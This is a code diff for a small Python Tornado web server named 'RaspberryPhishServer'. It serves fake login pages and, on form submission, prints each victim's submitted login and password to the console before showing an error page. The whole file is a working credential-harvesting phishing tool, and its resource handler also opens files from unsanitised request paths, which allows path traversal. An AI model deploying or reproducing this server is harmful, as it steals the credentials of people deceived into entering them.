@@ -1,40 +1,45 @@
 #!/usr/bin/env python
-# -*- coding: utf-8 -*
+# -*- coding: utf-8 -*-
 
 __title__ = "RaspberryPhishServer"
 
-pagePath="test/test.html"
-pagePath="test/test-error.html"
+pagePath = "test/"
 
 import tornado.ioloop
 import tornado.web
-import os
 
+
+# Handler for ressources
 class RscHandler(tornado.web.RequestHandler):
-    def get(self, pathRequest):
-        self.write(open("./rsc/" + pathRequest, 'rb').read())
+    def get(self, path_request):
+        self.write(open("rsc/" + pagePath + path_request, 'rb').read())
 
 
+# Handler for HTML files
 class MainHandler(tornado.web.RequestHandler):
     def get(self):
-        self.render("./pages/" + pagePath)
+        self.render("pages/" + pagePath + "index.html")
 
     def post(self):
-        #@TODO work with ids
+        # @TODO work with ids
         print("login > " + self.get_body_argument("login"))
         print("password > " + self.get_body_argument("password"))
-        #@TODO reload the same page or an error one or something else ...
-        self.render("./pages/" + pageErrorPath)
+        # @TODO reload the same page or an error one or something else ...
+        self.render("pages/" + pagePath + "error.html")
 
 
 if __name__ == "__main__":
     # create an instance
-    application = tornado.web.Application([
-                (r'/rsc/(.*)$',RscHandler),
-                (r"/", MainHandler),
-            ],
-        autoreload=True, debug=True )
+    application = tornado.web.Application(
+        [
+            (r'/rsc/(.*)$', RscHandler),
+            (r"/", MainHandler),
+        ],
+        autoreload=True, debug=True
+    )
+
     # bind a port
     application.listen(80)
-    # wait forever for satisfy users request
+
+    # loop forever for satisfy user's requests
     tornado.ioloop.IOLoop.instance().start()
